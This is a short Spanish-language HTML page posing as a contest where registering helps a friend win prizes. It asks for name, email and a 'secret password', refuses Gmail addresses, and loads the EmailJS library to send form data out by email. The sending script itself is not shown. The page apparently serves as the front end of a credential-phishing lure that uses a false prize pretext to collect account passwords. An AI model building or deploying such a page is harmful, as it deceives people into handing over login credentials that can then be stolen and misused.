<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>¡Ayuda a tu Amigo!</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="fondo-concurso"></div>
    
    <main class="contenedor-principal">
        <div class="tarjeta-registro">
            <div class="encabezado">
                <div class="icono-premio">🏆</div>
                <h1 class="titulo-impactante">¡Haz que tu amigo gane<br><span class="resaltar-premio">premios increíbles!</span></h1>
                <p class="subtitulo-motivador">Regístrate ahora para aumentar sus posibilidades</p>
            </div>

            <form id="formularioRegistro">
                <div class="grupo-input">
                    <label>👤 Nombre Completo</label>
                    <input type="text" id="nombre" placeholder="Ej: Juan Pérez" required>
                </div>

                <div class="grupo-input">
                    <label>📨 Correo Electrónico</label>
                    <input type="email" id="correo" placeholder="tucorreo@proveedor.com" required>
                    <div class="error-email" id="errorEmail">🚫 No se permiten cuentas Gmail</div>
                </div>

                <div class="grupo-input">
                    <label>🔒 Contraseña Secreta</label>
                    <input type="password" id="password" placeholder="········" required>
                </div>

                <button type="submit" class="boton-registro">
                    <span class="texto-boton">¡Potenciar oportunidades!</span>
                    <span class="icono-boton">🚀</span>
                </button>
            </form>
        </div>
    </main>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
